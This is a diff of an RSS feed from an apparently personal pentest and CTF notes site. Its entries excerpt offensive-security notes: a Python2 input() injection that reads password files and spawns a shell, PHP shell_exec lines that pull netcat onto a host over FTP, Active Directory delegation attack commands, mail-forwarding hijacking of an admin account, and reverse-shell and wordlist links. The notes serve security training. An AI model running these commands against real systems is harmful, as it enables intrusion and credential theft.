@@ -86,7 +86,17 @@ Broken Links # Check for broken links and domain takeover # For twitter, Twitter
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/resources/general_infosec/</guid>
-      <description>Training Resources  HackTheBox video WU (https://ippsec.rocks/#) Resources, cheatsheets etc about EVERYTHING (https://github.com/trimstray/the-book-of-secret-knowledge)  Network &amp;amp; Pentest  Network Pivoting (https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/) Remote Access Cheatsheet (https://dolosgroup.io/blog/remote-access-cheat-sheet) Many Reverse Shells (https://alamot.github.io/reverse_shells/)  Passcracking, Worlists &amp;amp; Passwords  Kaonashi worlists and rules (https://github.com/kaonashi-passwords/Kaonashi) One rule to rule them all (https://www.notsosecure.com/one-rule-to-rule-them-all/) Common French Passwords (https://github.com/tarraschk/richelieu) Rockyou (https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) Passwords Wordlists (https://weakpass.com/) Several Wordlists types (https://github.com/berzerk0/Probable-Wordlists) Language Dictionnaries (https://packetstormsecurity.com/Crackers/wordlists/page4/) Language Dictionnaries (http://www.gwicks.net/dictionaries.htm) SCADA default passwords (http://www.</description>
+      <description>Training Resources  HackTheBox video WU (https://ippsec.rocks/#) Resources, cheatsheets etc about EVERYTHING (https://github.com/trimstray/the-book-of-secret-knowledge)  Network &amp;amp; Pentest  Network Pivoting (https://orangecyberdefense.com/fr/insights/blog/ethical_hacking/etat-de-lart-du-pivoting-reseau-en-2019/) Remote Access Cheatsheet (https://dolosgroup.io/blog/remote-access-cheat-sheet) Many Reverse Shells (https://alamot.github.io/reverse_shells/) Shad0w C2 (https://github.com/bats3c/shad0w)  Passcracking, Worlists &amp;amp; Passwords  Kaonashi worlists and rules (https://github.com/kaonashi-passwords/Kaonashi) One rule to rule them all (https://www.notsosecure.com/one-rule-to-rule-them-all/) Common French Passwords (https://github.com/tarraschk/richelieu) Rockyou (https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) Passwords Wordlists (https://weakpass.com/) Several Wordlists types (https://github.com/berzerk0/Probable-Wordlists) Language Dictionnaries (https://packetstormsecurity.com/Crackers/wordlists/page4/) Language Dictionnaries (http://www.gwicks.net/dictionaries.htm) SCADA default passwords (http://www.</description>
+    </item>
+    
+    <item>
+      <title>Global Tricks (sysadmin)</title>
+      <link>/linux-systems/tricks/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/tricks/</guid>
+      <description>[WIP]
+# If you need to kill a specific process using a given port sudo fuser -k 445/tcp</description>
     </item>
     
     <item>
@@ -240,16 +250,6 @@ Proxychains Pivot # When you have access to a machine, you can use it as pivot t
       <guid>/cryptography/rsa/</guid>
       <description>Resources https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-1/ # Think about factordb.com to retrieve p and q from n 
 Theory # Used # c → cyphertext # m → Plaintext message converted as a number # e → public exponent # d → private exponent # n → modulo =&amp;gt; p * q # Encrypt c = (m^e)[n] =&amp;gt; pow(m,e,n) # Decrypt m = (c^d)[n] =&amp;gt; pow(c,d,n) # 5 times encryption c = m^(e1 * e2 * e3 * e4 * e5) m = c^(d1 * d2 * d3 * d4 * d5) # Can get n and e from openssl like this cat alice_pubkey.</description>
-    </item>
-    
-    <item>
-      <title>Recon and Enumeration</title>
-      <link>/linux-systems/recon_enumeration/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/linux-systems/recon_enumeration/</guid>
-      <description>Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ # Tmux shortcuts https://gist.github.com/MohamedAlaa/2961058 
-Basics hostname whoami id ifconfig uname -a uname -m # Check version using searchsploit -w distrib searchsploit -w kernel_version # Test trivials login combinaison # check /etc/passwd # then su login=password # Look for known machines arp -a # Get network configuration /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname # Find Linux distribution and version cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release; # Get environment variables cat /etc/profile; cat /etc/bashrc; cat ~/.</description>
     </item>
     
     <item>
@@ -429,7 +429,7 @@ Droopescan # Not Drupal specific but can work too (Wordpress, SilverStripe, Joom
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/email/</guid>
-      <description>Online tools # Domain e-mail syntax finder https://www.email-format.com https://hunter.io # E-mail validator https://tools.verifyemailaddress.io/ http://mailtester.com https://dnslytics.com/email-test https://verify-email.org/ https://verifalia.com/validate-email 
+      <description>Online tools # Domain e-mail syntax finder https://www.email-format.com https://hunter.io # E-mail validator https://tools.verifyemailaddress.io/ http://mailtester.com https://dnslytics.com/email-test https://verify-email.org/ https://verifalia.com/validate-email # IntelX new tool allows to browse records for a given domain https://phonebook.cz/ 
 The Harvester # theHarvester is a famous OSINT and scrapping tool for passiv recon on targets # Using API keys will highly increase results # TheHarvester received a great # Following modules need API key (api-keys.yaml) # bing, github, hunter, intlex, securitytrails, shodan, spyse Usage: theharvester options -d: Domain to search or company name -b: data source: baidu, bing, bingapi, dogpile, google, googleCSE, googleplus, google-profiles, linkedin, pgp, twitter, vhost, virustotal, threatcrowd, crtsh, netcraft, yahoo, all -s: start in result number X (default: 0) -v: verify host name via dns resolution and search for virtual hosts -f: save the results into an HTML and XML file (both) -n: perform a DNS reverse query on all ranges discovered -c: perform a DNS brute force for the domain name -t: perform a DNS TLD expansion discovery -e: use this DNS server -p: port scan the detected hosts and check for Takeovers (80,443,22,21,8080) -l: limit the number of results to work with(bing goes from 50 to 50 results, google 100 to 100, and pgp doesn\&amp;#39;t use this option) -h: use SHODAN database to query discovered hosts Examples: theharvester -d microsoft.</description>
     </item>
     
@@ -441,16 +441,6 @@ The Harvester # theHarvester is a famous OSINT and scrapping tool for passiv rec
       <guid>/other-systems/freeipa/</guid>
       <description>What is FreeIPA ? https://posts.specterops.io/attacking-freeipa-part-i-authentication-77e73d837d6a https://posts.specterops.io/attacking-freeipa-part-ii-enumeration-ad27224371e1# Open source alternative to Microsoft Windows Active Directory # Primarily used as an integrated management solution for Unix environments. # Similar to Active Directory, FreeIPA implements a full LDAP directory infrastructure # So all together we have a Unix host management system # Complete with LDAP and Kerberos that allows for multi-factor authentication. 
 Informations Files # Kerberos informations to get enrolled (location of KDCs.</description>
-    </item>
-    
-    <item>
-      <title>File Transfer</title>
-      <link>/linux-systems/file_transfer/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/linux-systems/file_transfer/</guid>
-      <description>NFS # You can remotely mount NFS volumes mount -t nfs xx.xx.xx.xx:/ /tmp/a 
-Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: &amp;lt;?php echo shell_exec(&amp;#34;echo open 192.168.42.102 21&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo user acknak jLQRZy4gyLhmMqz2whTw&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo binary&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo get netcat /usr/local/databases/netcat&amp;gt;&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo bye&amp;gt;&amp;gt; /usr/local/databases/ftp.</description>
     </item>
     
     <item>
@@ -522,7 +512,7 @@ DNS Zone Transfer # Zone transfer using dig dig @&amp;lt;ns&amp;gt; -p 54011 AXF
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/platforms-hunting/linkedin/</guid>
-      <description># Check the &amp;#34;see coordinates&amp;#34; on accounts # Sometimes, people link other resources 
+      <description>Tips &amp;amp; Tricks # Check the &amp;#34;see coordinates&amp;#34; on accounts # Sometimes, people link other resources# Getting likes, comment etc. /detail/recent-activity 
 Getting account linked to an e-mail # Great trick https://www.intelligencewithsteve.com/post/a-guide-to-searching-linkedin-by-email-address # Sales feature have been discontinued # Log to OWA and go to contacts https://outlook.live.com/owa/ https://outlook.live.com/people # Then add contact, using the target e-mail # Go to the LinkedIn tab and connect using a fake account # If an account is linked to the target e-mail, you should now see it in Outlook</description>
     </item>
     
@@ -552,7 +542,7 @@ Blind NoSQL Injection # Get size index.php ?chall_name=nosqlblind&amp;amp;flag[$
       
       <guid>/open-source-intelligence-osint/technical-recon/misc/opsec/</guid>
       <description>[WIP]
-https://amiunique.org/fp https://twitter.com/OSINTgeek/status/1258857825868156930?s=19 https://www.</description>
+https://amiunique.org/fp https://twitter.com/OSINTgeek/status/1258857825868156930?s=19 https://www.artbreeder.com/ https://www.</description>
     </item>
     
     <item>
@@ -599,6 +589,16 @@ Utilman.exe attack # You can access a SYSTEM cmd shell if you have access to the
       
       <guid>/linux-systems/programing-languages/python/</guid>
       <description>Input() exploitation # In Python2, input function is vulnerable # input(x) = eval(raw_input(x)) # Means that user inputs will be executed # You can exec code Please enter password : sys.stdout.write(open(&amp;#34;.passwd&amp;#34;).readline()) 13373439872909134298363103573901 # Another Please enter password : __import__(&amp;#39;os&amp;#39;).system(&amp;#39;cat /challenge/shell/shell6/.passwd &amp;gt; /tmp/flag&amp;#39;) cat /tmp/flag # Another Please enter password : __import__(&amp;#39;shutil&amp;#39;).copyfile(&amp;#39;/challenge/shell/shell6/.passwd&amp;#39;, &amp;#39;/tmp/flag2&amp;#39;) # You can even get a shell Please enter password : __import__(&amp;#39;os&amp;#39;).system(&amp;#39;sh&amp;#39;) # Another Please enter password : input(open(&amp;#34;.</description>
+    </item>
+    
+    <item>
+      <title>Recon and Enumeration</title>
+      <link>/linux-systems/recon_enumeration/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/recon_enumeration/</guid>
+      <description>Resources https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ # Tmux shortcuts https://gist.github.com/MohamedAlaa/2961058 
+Basics hostname whoami id ifconfig uname -a uname -m # Check version using searchsploit -w distrib searchsploit -w kernel_version # Test trivials login combinaison # check /etc/passwd # then su login=password # Look for known machines arp -a # Get network configuration /sbin/ifconfig -a; cat /etc/network/interfaces; cat /etc/sysconfig/network; cat /etc/resolv.conf; cat /etc/sysconfig/network; cat /etc/networks; iptables -L; hostname; dnsdomainname # Find Linux distribution and version cat /etc/issue; cat /etc/*-release; cat /etc/lsb-release; cat /etc/redhat-release; # Get environment variables cat /etc/profile; cat /etc/bashrc; cat ~/.</description>
     </item>
     
     <item>
@@ -723,7 +723,7 @@ Pwndb.py # Tool using onion website http://pwndb2am4tzkvold.onion/ to search lea
       
       <guid>/open-source-intelligence-osint/technical-recon/misc/darkweb_investigation/</guid>
       <description>[WIP]
-Search the Darkweb https://medium.com/@darksearch/darksearch-the-1st-real-search-engine-dark-web-darksearch-vs-ahmia-84852fd4c51b https://darksearch.io/</description>
+Search the Darkweb https://medium.com/@darksearch/darksearch-the-1st-real-search-engine-dark-web-darksearch-vs-ahmia-84852fd4c51b https://darksearch.io/https://webhose.io/blog/dark-web/the-top-5-dark-web-search-engines/ # - Candle # - Torch # - Kilos # - AHMIA # - Tor77 # - Darksearch</description>
     </item>
     
     <item>
@@ -744,6 +744,16 @@ Patator # Fuzzing patator http_fuzz url=http://10.10.10.150/FILE0 0=wordlist.txt
       
       <guid>/windows-systems/network-and-domain-recon/domain_mapping/</guid>
       <description>BloodHound Tips # Right Click # Get information about the node and also how to compromise the user / machine # Owned # Can be usefull during an internal pentest to note where you are # Nodes will be tagged with a skull # It&amp;#39;s then possible to ask the shortest path to a node from the owned ones # Filters # Can be usefull # Shortcuts # CTRL --&amp;gt; Change node display # CTRL+SHIFT+I --&amp;gt; Developper Tools # CTRL+R --&amp;gt; Reload display # Still possible to edit data to set what you want# If you don&amp;#39;t have access to a domain machine but have creds # You can run from host runas /netonly /user:FQDN.</description>
+    </item>
+    
+    <item>
+      <title>File Transfer</title>
+      <link>/linux-systems/file_transfer/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/linux-systems/file_transfer/</guid>
+      <description>NFS # You can remotely mount NFS volumes mount -t nfs xx.xx.xx.xx:/ /tmp/a 
+Linux FTP #!/bin/sh  ftp -n IP &amp;lt;&amp;lt;END_SCRIPT quote USER acknak quote PASS jLQRZy4gyLhmMqz2whTw binary GET file.py quit END_SCRIPT exit 0 # Can also be done over php: &amp;lt;?php echo shell_exec(&amp;#34;echo open 192.168.42.102 21&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo user acknak jLQRZy4gyLhmMqz2whTw&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo binary&amp;gt;&amp;gt; /usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo get netcat /usr/local/databases/netcat&amp;gt;&amp;gt;/usr/local/databases/ftp.txt&amp;#34;);?&amp;gt; &amp;lt;?php echo shell_exec(&amp;#34;echo bye&amp;gt;&amp;gt; /usr/local/databases/ftp.</description>
     </item>
     
     <item>
@@ -907,7 +917,7 @@ Online DNS tools and services # VirusTotal runs its own passive DNS replication 
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/platforms-hunting/twitter/</guid>
-      <description>Tips &amp;amp; Tricks Geolocation # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweet geolocation https://onemilliontweetmap.com Downloader # Twitter video downloader https://twdown.net/ Account Analysis # Tweeter account analysis (account needed) https://tweetreach.com/ # When was created an account http://twbirthday.com/***REMOVED***/ # Sleeping time (account needed) http://sleepingtime.org/ # Simple analysis/analytics https://socialbearing.com/search/general/sodifrance https://foller.me # See all tweets from one account (account needed) https://www.allmytweets.net/connect/ Tracking Accounts &amp;amp; Modifications # With spoonbill, you can check and record people accounts modification # It checks accounts of people you&amp;#39;re following https://spoonbill.</description>
+      <description>Tips &amp;amp; Tricks Geolocation # Search using geocode geocode:36.1143855,-115.1727518,1km # Tweet geolocation https://onemilliontweetmap.com Downloader # Twitter video downloader https://twdown.net/ Account Analysis # Tweeter account analysis (account needed) https://tweetreach.com/ # When was created an account http://twbirthday.com/haaxmax/ # Sleeping time (account needed) http://sleepingtime.org/ # Simple analysis/analytics https://socialbearing.com/search/general/sodifrance https://foller.me # See all tweets from one account (account needed) https://www.allmytweets.net/connect/ Data visualization # Free tool to build graph and visualize the spread of claims and fact checking https://hoaxy.</description>
     </item>
     
     <item>
@@ -1239,7 +1249,7 @@ Userland &amp;amp; Elevated # Userland techniques # HKCU # Create a REG_SZ value
       
       <guid>/open-source-intelligence-osint/human-recon/pictures/</guid>
       <description>General # Flickr Image search https://www.flickr.com/map 
-Reverse Image Search # General Engines https://images.google.com/ https://tineye.com/ https://www.bing.com/?scope=images&amp;amp;nr=1&amp;amp;FORM=NOFORM # Reverse Russia https://www.yandex.com/images/ # Reverse China http://images.baidu.com/ 
+Reverse Image Search # General Engines https://images.google.com/ https://tineye.com/ https://www.bing.com/?scope=images&amp;amp;nr=1&amp;amp;FORM=NOFORM # Reverse Russia https://www.yandex.com/images/ # Reverse China http://images.baidu.com/ # Dedicated to faces # Results are not free but previews are available (used then on traditionnal engines) https://pimeyes.com/en/ 
 Image Investigation # EXIF and metadata http://exif.regex.info/exif.cgi # Basics Forensics https://fotoforensics.com/ # Text recognition (OCR) https://www.newocr.com/ # Stolen Camera Finder https://www.stolencamerafinder.com/ 
 Deblurring images # Gaussian Blur # Install GIMP Plugin &amp;#34;G&amp;#39;MIC&amp;#34; # Filters&amp;gt;G’MIC&amp;gt;Details&amp;gt;Sharpen (Deblur)# Pixelize # The Pixelize blur works by dividing an image into a number of squares # and then replacing all the pixels in each square by average of their values.</description>
     </item>
@@ -1374,7 +1384,7 @@ Identification and manual test # Using netcat nc -nv IP 119 LIST GROUP group_nam
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/windows-systems/privilege-escalation/delegations/</guid>
-      <description>RBCD Exploitation https://github.com/aas-n/leHACK19 # Importing Powerview and Powermad Import-Module .\Powerview.ps1 Import-Module .\Powermad.ps1 # Authentication $TargetComputer = &amp;#34;DC01.domain.lan&amp;#34; $SecPassword = ConvertTo-SecureString &amp;#39;passw0rd&amp;#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(&amp;#39;DOMAIN\ControlledAccount&amp;#39;, $SecPassword) # Get our user&amp;#39;s SID $AttackerSID = Get-DomainUser ControlledUser -Credential $Cred -Server 10.10.10.10 -Properties objectsid | Select -Expand objectsid $ACE = Get-DomainObjectACL $TargetComputer -Credential $Cred -Server 10.10.10.10 | ?{$_.SecurityIdentifier -match $AttackerSID} # Adding a machine and getting SID New-MachineAccount -Credential $Cred -Domain domain.</description>
+      <description>Unconstrained Delegation # Nice resource for user account =/= machine account in UC http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html # AD Objects having Unconstrained Delegation issues have the TRUSTED_FOR_DELEGATION flag set # You can search for users using Pywerview $ python pywerview.py get-netuser -u ownedUser -p userPassword -d foo.lan -t dc1.foo.lan --unconstrained # You can also request through ldapdomain dump and then grep for interesting $ ldapdomaindump -u &amp;#34;foo.lan\\ownedUser&amp;#34; -p &amp;#34;userPassword&amp;#34; 192.168.30.10 $ grep TRUSTED_FOR_DELEGATION *.</description>
     </item>
     
     <item>
@@ -1393,7 +1403,7 @@ SMB Server setup # Set up a SMB server using smbserver.py from impacket smbserve
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/human-recon/geolocation/</guid>
-      <description># Snapchat Live Map can be good and funny source https://map.snapchat.com # Learn to use Overpass API https://osmlab.github.io/learnoverpass//en/ 
+      <description># Snapchat Live Map can be good and funny source https://map.snapchat.com # Learn to use Overpass API https://osmlab.github.io/learnoverpass//en/ # Aerial pictures of building and monuments https://www.euroluftbild.de/en/ https://www.euroluftbild.de/ 
 Realtime Movement (MISC) # Flight Radar in realtime https://www.flightradar24.com # Marine Trafic in realtime https://www.marinetraffic.com/ # Instant StreetView https://www.instantstreetview.com/ # Car embedded cameras tracks https://openstreetcam.org # Sun position over time https://www.suncalc.org/#/48.8376,2.3456,8/2020.05.08/12:42/1/3 
 Photo identification # Find photos taken by the same camera using serial number # We don&amp;#39;t know how files are processed/stored.</description>
     </item>
@@ -1758,7 +1768,7 @@ Credentials bruteforce # Using ncrack for one user ncrack -vv -u nina -P passwor
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/network/services-enumeration/4555_rsip/</guid>
-      <description>Forwarding admin&amp;rsquo;s mails # Connection through netcat (can test for creds) nc -nv &amp;lt;IP&amp;gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax ***REMOVED*** # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.</description>
+      <description>Forwarding admin&amp;rsquo;s mails # Connection through netcat (can test for creds) nc -nv &amp;lt;IP&amp;gt; 4555 # Get commands HELP # Get users (hopefully an admin?) listusers # Add user adduser haax haaxpass # Set an alias for our user setalias mailadmin haax # Set mail forwarding setforwarding mailadmin haax@lab.</description>
     </item>
     
   </channel>
